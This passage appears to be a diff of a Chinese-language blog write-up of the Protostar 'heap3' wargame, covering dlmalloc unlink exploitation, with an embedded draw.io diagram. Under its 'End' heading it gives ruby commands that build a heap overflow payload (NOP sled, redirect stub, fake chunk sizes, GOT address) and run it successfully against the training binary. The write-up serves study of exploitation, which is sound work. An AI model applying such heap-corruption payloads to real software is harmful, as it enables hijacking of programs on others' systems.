+	width="1504"
+	height="316"
+	srcset="/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, /p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="nop"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="475"
+		data-flex-basis="1142px"
+	
+></p>
+<p>那么重新画一下图，就是这样：</p>
+<p><img src="/p/protostar_heap_3/true.png"
+	width="1806"
+	height="830"
+	srcset="/p/protostar_heap_3/true_hue05f22c1f5f25cc8fb5039835853a76c_244669_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hue05f22c1f5f25cc8fb5039835853a76c_244669_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="true"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="522px"
+	
+></p>
+<hr>
+<h2 id="end">End</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ ruby -e <span class="s1">&#39;puts &#34;\x90&#34;*12 + &#34;\x68\x64\x88\x04\x08\xc3&#34; + &#34;A&#34;*14 + &#34;\xf8\xff\xff\xff&#34; + &#34;\xfc\xff\xff\xff&#34;   &#39;</span> &gt; A
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ ruby -e <span class="s1">&#39;puts &#34;\xef\xbe\xad\xde&#34;*2 + &#34;\x1c\xb1\x04\x08&#34; + &#34;\x08\xc0\x04\x08&#34;   &#39;</span> &gt; B
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ /opt/protostar/bin/heap3 <span class="sb">`</span>cat /tmp/A<span class="sb">`</span> <span class="sb">`</span>cat /tmp/B<span class="sb">`</span> ABCD
+</span></span><span class="line"><span class="cl">that wasn<span class="err">&#39;</span>t too bad now, was it? @ <span class="m">1648020034</span>
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$
+</span></span></code></pre></div><p><img src="/p/protostar_heap_3/finally.png"
+	width="2678"
+	height="630"
+	srcset="/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, /p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="end"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="425"
+		data-flex-basis="1020px"
+	
+></p>
+<p>最后附上 Senri 一开始为了方便理解画的图&hellip;实际上并没有方便理解太多</p>
+<p>大概只是觉得 <a class="link" href="https://app.diagrams.net"  target="_blank" rel="noopener"
+    >draw.io</a> 这个网站画图很好玩</p>
+<p>然后就很精确地把第一张图的每个小格子都对应到了 byte 大小x</p>
+<p>结果只是浪费了很多时间罢了</p>
+<p>不过可能对你会有帮助&hellip;?</p>
+<p>顺带一提如果这张图遇到了没法向下滑动的问题&hellip;这时候请尽量在图片以外滑动x</p>
 <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=5,IE=9" ><![endif]-->
 <!DOCTYPE html>
 <html>
 <head>
-<title>Untitled Diagram</title>
+<title>Untitled Diagram-6-7</title>
 <meta charset="utf-8"/>
 </head>
-<body><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-04-06T08:54:40.591Z\&quot; agent=\&quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&quot; etag=\&quot;dhEpq4yiQHziwCyBc8yo\&quot; version=\&quot;17.4.0\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;9m9pWsRvkve3vRoIh5zU\&quot; name=\&quot;Page-1\&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
+<body><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;target&quot;:&quot;blank&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;page&quot;:0,&quot;toolbar&quot;:&quot;pages zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-04-07T03:57:15.460Z\&quot; agent=\&quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&quot; etag=\&quot;2EIwbI9UyFxHR66eEPRj\&quot; version=\&quot;17.4.0\&quot; type=\&quot;device\&quot; pages=\&quot;2\&quot;&gt;&lt;diagram id=\&quot;9m9pWsRvkve3vRoIh5zU\&quot; name=\&quot;Page-1\&quot;&gt;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&lt;/diagram&gt;&lt;diagram id=\&quot;Yspwrotni0tyzMKoO_N9\&quot; name=\&quot;Page-2\&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
 <script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>
 </body>
 </html>
-
 </section>
 
 
@@ -800,6 +1097,10 @@ Assembly - Little Endian:
     <li><a href="#references">References</a></li>
     <li><a href="#dlmalloc-basics">Dlmalloc Basics</a></li>
     <li><a href="#heap-three">Heap Three</a></li>
+    <li><a href="#before-unlink">Before <code>unlink()</code></a></li>
+    <li><a href="#creating-a-fake-chunk">Creating a fake chunk</a></li>
+    <li><a href="#free-a-fastbin">Free a fastbin</a></li>
+    <li><a href="#end">End</a></li>
   </ol>
 </nav>
         </div>
